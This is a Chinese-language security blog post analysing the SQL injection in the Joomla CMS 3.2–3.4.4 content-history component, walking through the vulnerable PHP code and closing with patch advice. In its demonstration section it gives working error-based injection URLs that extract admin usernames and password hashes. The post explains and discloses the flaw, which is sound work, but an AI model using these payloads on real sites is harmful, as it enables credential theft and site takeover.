<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="昨日(2015-10-22)，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。 一、原理分析在 Joomla CMS 中有一个查看历史编辑版本的组件(com_contenthistory)，该功能本应只有管理员才能访问，但是由于开发人员">
<meta name="keywords" content="security,web">
<meta property="og:type" content="article">
<meta property="og:title" content="Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析">
<meta property="og:url" content="http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/index.html">
<meta property="og:site_name" content="rickgray.me">
<meta property="og:description" content="昨日(2015-10-22)，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。 一、原理分析在 Joomla CMS 中有一个查看历史编辑版本的组件(com_contenthistory)，该功能本应只有管理员才能访问，但是由于开发人员">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/1.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/2.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/3.png">
<meta property="og:updated_time" content="2018-04-24T15:48:57.517Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析">
<meta name="twitter:description" content="昨日(2015-10-22)，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。 一、原理分析在 Joomla CMS 中有一个查看历史编辑版本的组件(com_contenthistory)，该功能本应只有管理员才能访问，但是由于开发人员">
<meta name="twitter:image" content="http://rickgray.me/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2015/11/03/server-side-template-injection-attack-analysis/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2015/10/09/wordpress-xmlrpc-brute-force-in-one-request/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&text=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&is_video=false&description=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析&body=Check out this article: http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&name=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、原理分析"><span class="toc-number">1.</span> <span class="toc-text">一、原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、漏洞演示"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、修复方案"><span class="toc-number">3.</span> <span class="toc-text">三、修复方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、总结"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">rickgray.me</span>
      </span>
      
    <div class="postdate">
        <time datetime="2015-10-22T16:00:00.000Z" itemprop="datePublished">2015-10-23</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>昨日(2015-10-22)，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。</p>
<h3 id="一、原理分析"><a href="#一、原理分析" class="headerlink" title="一、原理分析"></a>一、原理分析</h3><p>在 Joomla CMS 中有一个查看历史编辑版本的组件(com_contenthistory)，该功能本应只有管理员才能访问，但是由于开发人员的疏忽，导致该功能的访问并不需要相应的权限。通过访问 <code>/index.php?option=com_contenthistory</code> 可以使得服务端加载历史版本处理组件。程序流程会转到 <code>/components/com_contenthistory/contenthistory.php</code> 文件中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'_JEXEC'</span>) <span class="keyword">or</span> <span class="keyword">die</span>;</span><br><span class="line"></span><br><span class="line">$lang = JFactory::getLanguage();</span><br><span class="line">$lang-&gt;load(<span class="string">'com_contenthistory'</span>, JPATH_ADMINISTRATOR, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>)</span><br><span class="line">||    $lang-&gt;load(<span class="string">'com_contenthistory'</span>, JPATH_SITE, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> JPATH_COMPONENT_ADMINISTRATOR . <span class="string">'/contenthistory.php'</span>;</span><br></pre></td></tr></table></figure>
<p>可以看到该组件加载时并没有进行相关权限的监测，而 Joomla 中，一般的后台调用组件 (<code>/administrator/components/</code>下的组件) 都会进行组件对应的权限检查，例如后台中的 <code>com_contact</code> 组件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!JFactory::getUser()-&gt;authorise(<span class="string">'core.manage'</span>, <span class="string">'com_contact'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> JError::raiseWarning(<span class="number">404</span>, JText::_(<span class="string">'JERROR_ALERTNOAUTHOR'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，程序在处理 <code>contenthistory</code> 组建时，并没有进行一个权限检查，程序初始化并设置好组件相关配置后，包含文件 <code>/administrator/components/com_contenthistory/contenthistory.php</code>，其内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'_JEXEC'</span>) <span class="keyword">or</span> <span class="keyword">die</span>;</span><br><span class="line"></span><br><span class="line">$controller = JControllerLegacy::getInstance(<span class="string">'Contenthistory'</span>, <span class="keyword">array</span>(<span class="string">'base_path'</span> =&gt; JPATH_COMPONENT_ADMINISTRATOR));</span><br><span class="line">$controller-&gt;execute(JFactory::getApplication()-&gt;input-&gt;get(<span class="string">'task'</span>));</span><br><span class="line">$controller-&gt;redirect();</span><br></pre></td></tr></table></figure>
<p>程序初始化基于 <code>contenthistory</code> 组件的控制类 <code>JControllerLegacy</code>，然后直接调用控制类的 <code>execute()</code> 方法，在 <code>execute()</code> 方法中，会调用其控制类中的 <code>display()</code>，代码位于 <code>/libraries/legacy/controller/legacy.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($cachable = false, $urlparams = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $document = JFactory::getDocument();</span><br><span class="line">    $viewType = $document-&gt;getType();</span><br><span class="line">    $viewName = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'view'</span>, <span class="keyword">$this</span>-&gt;default_view);</span><br><span class="line">    $viewLayout = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'layout'</span>, <span class="string">'default'</span>, <span class="string">'string'</span>);</span><br><span class="line"></span><br><span class="line">    $view = <span class="keyword">$this</span>-&gt;getView($viewName, $viewType, <span class="string">''</span>, <span class="keyword">array</span>(<span class="string">'base_path'</span> =&gt; <span class="keyword">$this</span>-&gt;basePath, <span class="string">'layout'</span> =&gt; $viewLayout));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get/Create the model</span></span><br><span class="line">    <span class="keyword">if</span> ($model = <span class="keyword">$this</span>-&gt;getModel($viewName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Push the model into the view (as default)</span></span><br><span class="line">        $view-&gt;setModel($model, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    (...省略...)</span><br><span class="line">    <span class="keyword">if</span> ($cachable &amp;&amp; $viewType != <span class="string">'feed'</span> &amp;&amp; $conf-&gt;get(<span class="string">'caching'</span>) &gt;= <span class="number">1</span>)</span><br><span class="line">    &#123; (...省略...) &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $view-&gt;display();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>处理程序从传递的参数中获取 <code>view</code> 和 <code>layout</code> 的参数值进行初始化视图，并且调用 <code>$model = $this-&gt;getModel($viewName)</code> 加载对应数据模型，最终会调用 <code>$view-&gt;display()</code> 函数进行视图处理。</p>
<p>Joomla 新版本 3.4.5 中修复的SQL注入漏洞涉及的是历史查看操作，也就是 <code>view=history</code> 时的程序处理会导致注入。在程序进行数据提取时，会进入 <code>/administrator/components/com_contenthistory/models/history.php</code> 文件中的 <code>getListQuery()</code> 函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getListQuery</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Create a new query object.</span></span><br><span class="line">	$db = <span class="keyword">$this</span>-&gt;getDbo();</span><br><span class="line">	$query = $db-&gt;getQuery(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Select the required fields from the table.</span></span><br><span class="line">	$query-&gt;select(</span><br><span class="line">		<span class="keyword">$this</span>-&gt;getState(</span><br><span class="line">			<span class="string">'list.select'</span>,</span><br><span class="line">			<span class="string">'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,'</span> .</span><br><span class="line">			<span class="string">'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'</span></span><br><span class="line">		)</span><br><span class="line">	)</span><br><span class="line">	-&gt;from($db-&gt;quoteName(<span class="string">'#__ucm_history'</span>) . <span class="string">' AS h'</span>)</span><br><span class="line">	-&gt;where($db-&gt;quoteName(<span class="string">'h.ucm_item_id'</span>) . <span class="string">' = '</span> . <span class="keyword">$this</span>-&gt;getState(<span class="string">'item_id'</span>))</span><br><span class="line">	-&gt;where($db-&gt;quoteName(<span class="string">'h.ucm_type_id'</span>) . <span class="string">' = '</span> . <span class="keyword">$this</span>-&gt;getState(<span class="string">'type_id'</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Join over the users for the editor</span></span><br><span class="line">	-&gt;select(<span class="string">'uc.name AS editor'</span>)</span><br><span class="line">	-&gt;join(<span class="string">'LEFT'</span>, <span class="string">'#__users AS uc ON uc.id = h.editor_user_id'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Add the list ordering clause.</span></span><br><span class="line">	$orderCol = <span class="keyword">$this</span>-&gt;state-&gt;get(<span class="string">'list.ordering'</span>);</span><br><span class="line">	$orderDirn = <span class="keyword">$this</span>-&gt;state-&gt;get(<span class="string">'list.direction'</span>);</span><br><span class="line">	$query-&gt;order($db-&gt;quoteName($orderCol) . $orderDirn);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $query;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意下面这段SQL语句构造部分：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query-&gt;select(</span><br><span class="line">	<span class="keyword">$this</span>-&gt;getState(</span><br><span class="line">		<span class="string">'list.select'</span>,</span><br><span class="line">		<span class="string">'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,'</span> .</span><br><span class="line">		<span class="string">'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'</span></span><br><span class="line">	)</span><br><span class="line">)</span><br><span class="line">-&gt;from($db-&gt;quoteName(<span class="string">'#__ucm_history'</span>) . <span class="string">' AS h'</span>)</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'h.ucm_item_id'</span>) . <span class="string">' = '</span> . <span class="keyword">$this</span>-&gt;getState(<span class="string">'item_id'</span>))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'h.ucm_type_id'</span>) . <span class="string">' = '</span> . <span class="keyword">$this</span>-&gt;getState(<span class="string">'type_id'</span>))</span><br></pre></td></tr></table></figure>
<p>其中 <code>getState()</code> 函数用于获取模型的属性和其对应的值，其函数定义位于 <code>/ibraries/legacy/model/legacy.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getState</span><span class="params">($property = null, $default = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;__state_set)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// Protected method to auto-populate the model state.</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;populateState();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Set the model state set flag to true.</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;__state_set = <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $property === <span class="keyword">null</span> ? <span class="keyword">$this</span>-&gt;state : <span class="keyword">$this</span>-&gt;state-&gt;get($property, $default);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后会调用 <code>populateState()</code> 函数来初始化参数值和提取并过滤某些参数，在 <code>contenthistory</code> 组建中定义有自己的 <code>populateState()</code> 函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">populateState</span><span class="params">($ordering = null, $direction = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	(...省略...)</span><br><span class="line">	<span class="comment">// List state information.</span></span><br><span class="line">	<span class="keyword">parent</span>::populateState(<span class="string">'h.save_date'</span>, <span class="string">'DESC'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数最后，会调用父类的 <code>populateState()</code> 函数，因为该数据模型继承于 JModelList，所以父类相关代码位于 <code>/libraries/legacy/model/list.php</code> 中，而在父类该函数的处理中会解析请求中传递的 <code>list[]</code> 参数，解析并过滤预设键的值，但是却忽略了 <code>list[select]</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">populateState</span><span class="params">($ordering = null, $direction = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	(...省略...)</span><br><span class="line">		<span class="comment">// Receive &amp; set list options</span></span><br><span class="line">		<span class="keyword">if</span> ($list = $app-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.list'</span>, <span class="string">'list'</span>, <span class="keyword">array</span>(), <span class="string">'array'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">foreach</span> ($list <span class="keyword">as</span> $name =&gt; $value)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// Extra validations</span></span><br><span class="line">				<span class="keyword">switch</span> ($name)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'fullordering'</span>:</span><br><span class="line">						(...省略...)</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'ordering'</span>:</span><br><span class="line">						(...省略...)</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'direction'</span>:</span><br><span class="line">						(...省略...)</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'limit'</span>:</span><br><span class="line">						(...省略...)</span><br><span class="line">					<span class="keyword">default</span>:</span><br><span class="line">						$value = $value;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">$this</span>-&gt;setState(<span class="string">'list.'</span> . $name, $value);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	(...省略...)</span><br></pre></td></tr></table></figure>
<p>而传递 <code>list[select]</code> 参数值最终会被解析到上述组件视图进行处理时 SQL 语句构建中的 <code>list.select</code> 里，从而导致了注入。</p>
<h3 id="二、漏洞演示"><a href="#二、漏洞演示" class="headerlink" title="二、漏洞演示"></a>二、漏洞演示</h3><p>通过上面简单的分析，已经知道了受影响的 Joomla 版本中，<code>contenthistory</code> 组件访问不受权限的控制，并且当进行 <code>view=history</code> 请求时会解析请求参数中 <code>list[select]</code> 的值拼接到 SQL 语句中。下面是该漏洞的简单验证和利用方法。</p>
<p><em>1.漏洞验证</em></p>
<pre><code>http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&amp;view=history&amp;list[select]=1
</code></pre><p>因为在进行 SQL 语句拼接的时候，获取了 <code>list.ordering</code> 进行数据查询中的 <code>order</code> 操作，若不提供默认会将其设置为数据进行处理，相关处理位于 <code>/libraries/joomla/database/driver.php</code> 的 quoteName() 函数中。</p>
<p>因此，访问上述构造的URL，服务器会报错：</p>
<p><img src="/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/1.png" alt=""></p>
<p><em>2.漏洞利用</em></p>
<p>因为在 SQL 语句拼接时，程序框架针对每个 <code>from</code> 或者 <code>where</code> 操作进行了换行处理，所以这里并不能使用 <code>#</code>、<code>--</code> 等符号来注释掉后面的语句，只能通过报错注入进行数据提取。但是语句的成功执行有一定的前提条件，也就是传递的 <code>item_id</code> 和 <code>type_id</code> 参数值必须于数据库中有效，同时传递 <code>list[ordering]</code> 参数 (空值即可)，这样注入的语句才能够得到执行，从而进行报错注入。</p>
<p>这里经过多个漏洞站点的测试可以简单的使用 <code>item_id=1&amp;type_id=1</code>，当然了为了准确性和有效性，可以通过爆破的方式来得到这两个参数的有效值，然后再进行注入操作。</p>
<p>(Tips：Joomla 中构造的 SQL 语句中 <code>#_</code> 最终会在执行前被替换为表前缀)</p>
<p>下面是获取用户名/密码哈希的漏洞演示过程：</p>
<pre><code>http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&amp;view=history&amp;item_id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(*),concat((select username from %23__users limit 0,1),floor(rand(0)*2)) from information_schema.tables group by 2)x)
</code></pre><p><img src="/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/2.png" alt=""></p>
<pre><code>http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&amp;view=history&amp;item_id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(*),concat((select password from %23__users limit 0,1),floor(rand(0)*2)) from information_schema.tables group by 2)x)
</code></pre><p><img src="/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/3.png" alt=""></p>
<h3 id="三、修复方案"><a href="#三、修复方案" class="headerlink" title="三、修复方案"></a>三、修复方案</h3><ol>
<li>从 <a href="https://github.com/joomla/joomla-cms/releases" target="_blank" rel="noopener">https://github.com/joomla/joomla-cms/releases</a> 获取最新版本进行重新安装；</li>
<li>从 <a href="https://github.com/joomla/joomla-cms/releases" target="_blank" rel="noopener">https://github.com/joomla/joomla-cms/releases</a> 下载相应版本的补丁程序进行升级；</li>
</ol>
<h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>就 Joomla CMS 的用户量来看，目前还有大量的站点的数据正受到该漏洞的威胁。该漏洞的产生本质上是由于访问控制的缺失和过滤不严格造成。访问控制的缺失导致本应只有管理员才能进行访问和加载的 <code>contenthistory</code> 组件能够被任意用户访问和加载，而参数的过滤不严格，导致攻击者能够构造出恶意的参数到执行流中产生注入。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="http://www.sebug.net/vuldb/ssvid-89680" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89680</a></li>
<li><a href="https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html" target="_blank" rel="noopener">https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html</a></li>
<li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/" target="_blank" rel="noopener">https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/</a></li>
</ul>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、原理分析"><span class="toc-number">1.</span> <span class="toc-text">一、原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、漏洞演示"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、修复方案"><span class="toc-number">3.</span> <span class="toc-text">三、修复方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、总结"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&text=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&is_video=false&description=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析&body=Check out this article: http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/&title=Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
